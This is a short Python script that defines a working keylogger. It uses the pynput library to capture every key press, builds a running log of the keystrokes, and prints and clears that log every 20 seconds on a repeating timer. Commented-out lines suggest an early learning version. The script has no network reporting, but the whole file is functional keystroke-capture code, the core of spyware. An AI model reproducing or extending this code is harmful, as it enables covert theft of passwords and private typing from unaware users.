#!/usr/bin/env python
import pynput.keyboard, threading


class Keylogger:
    def __init__(self):
        self.log = ""
        # print("we are in constructor method")

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_strokes(self, key):
        try:
            # log = log + str(key.char)
            # self.append_to_log(str(key.char))
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
               current_key = " " + str(key) + " "
        self.append_to_log(current_key)


    def report(self):
        # print(log)
        # log = ""
        print(self.log)
        self.log = ""
        timer = threading.Timer(20, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_strokes)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

